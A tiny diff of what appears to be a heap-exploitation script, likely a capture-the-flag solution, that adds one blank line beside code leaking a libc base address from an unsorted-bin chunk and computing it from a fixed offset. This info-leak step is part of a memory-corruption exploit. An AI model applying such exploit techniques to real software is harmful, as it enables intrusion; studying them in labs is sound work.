@@ -113,6 +113,7 @@ def main():
 
     # leak libc base (chunk_8 is in unsorted bin)
     wish(p)
+
     leak = u64(view(p, 1).ljust(8, b"\x00"))
     libc_base = leak - 0x219fc0
     print(hex(libc_base))
